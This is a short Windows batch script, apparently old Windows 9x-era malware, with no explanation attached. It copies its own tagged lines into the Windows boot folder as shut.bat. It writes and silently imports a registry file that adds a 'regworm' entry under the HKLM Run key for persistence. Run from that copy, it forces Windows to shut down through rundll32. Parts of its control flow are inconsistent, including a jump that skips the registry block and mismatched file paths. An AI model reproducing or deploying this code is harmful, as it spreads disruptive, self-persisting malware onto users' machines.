@echo off %shut%
if "%0"=="%winbootdir%\SHUT.BAT" goto shutcode >nul
type %0 |find /i "SHUT" >%winbootdir%\shut.bat
goto shutend 
@echo:REGEDIT4 >%winbootdir%\shut.reg
@echo:>>c:\shut.reg
@echo:[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>%winbootdir%\shut.reg
@echo:"regworm"="regworm.bat">>%winbootdir%\shut.reg
regedit %winbootdir%\shut.reg >nul
goto shutend
:shutcode
%windir%\rundll32.exe %windir%\user.exe,exitwindows >nul %shut%
rem caps
:shutend
